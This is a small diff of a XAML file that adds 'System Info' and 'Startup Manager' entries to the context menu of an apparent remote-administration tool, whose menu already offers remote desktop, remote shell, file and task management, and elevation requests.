@@ -271,6 +271,8 @@
                         </DataGrid.Columns>
                         <DataGrid.ContextMenu>
                             <ContextMenu>
+                                <MenuItem Header="System Info" Click="Sysinfo_Click"/>
+                                <Separator/>
                                 <MenuItem Header="Remote Options">
                                     <MenuItem Header="Remote Desktop" Click="RemoteDesktop_Click"/>
                                     <MenuItem Header="Remote Shell" Click="RemoteShell_Click"/>
@@ -280,6 +282,7 @@
                                 <MenuItem Header="Task Manager" Click="TaskManager_Click"/>
                                 <MenuItem Header="File Manager" Click="FileManager_Click"/>
                                 <MenuItem Header="Visit Website" Click="VisitWebsite_Click"/>
+                                <MenuItem Header="Startup Manager" Click="StartUpManager_Click"/>
                                 <MenuItem Header="Request Elevation" Click="RequestElevation_Click"/>
                                 </MenuItem>
                                 <Separator/>
